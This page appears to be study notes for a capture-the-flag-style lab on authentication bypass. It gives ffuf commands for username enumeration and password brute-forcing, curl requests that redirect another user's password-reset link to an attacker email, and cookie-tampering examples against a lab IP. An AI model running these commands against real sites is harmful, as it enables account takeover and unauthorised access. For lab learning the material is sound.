---
title: Authentication Bypass
sidebar_position: 1
description: Authentication bypass vulnerability.
---

## Username Enumeration
- Support website: http://10.10.129.12/customers/signup/
    ```
    ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.129.12/customers/signup -mr "username already exists"
    ```

## Bruteforce Password
- Use the identified usernames and attempt to find the passwords.
- If you created your valid_usernames file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.
    ```
    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.129.12/customers/login -fc 200
    ```
- Bruteforce individual usernames.
    ```
    ffuf -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W1 -X POST -d "username=<USERNAME>&password=W1" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.129.12/customers/login -fc 200
    ```

## Logic Flaws
- Password reset request looks like below.
    ```
    curl 'http://10.10.129.12/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
    ```
- Create an account with email id `attacker@hacker.com` and update the curl request like below.
    ```
    curl 'http://10.10.129.12/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
    ```

## Cookie Tampering
- Cookies are set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.
- Some of the examples of cookies set after successful login are
  - `Set-Cookie: logged_in=true; Max-Age=3600; Path=/`
  - `Set-Cookie: admin=false; Max-Age=3600; Path=/`
  - `Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`
- `eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==` - base64 decoded has the value of `{"id":1,"admin": false}`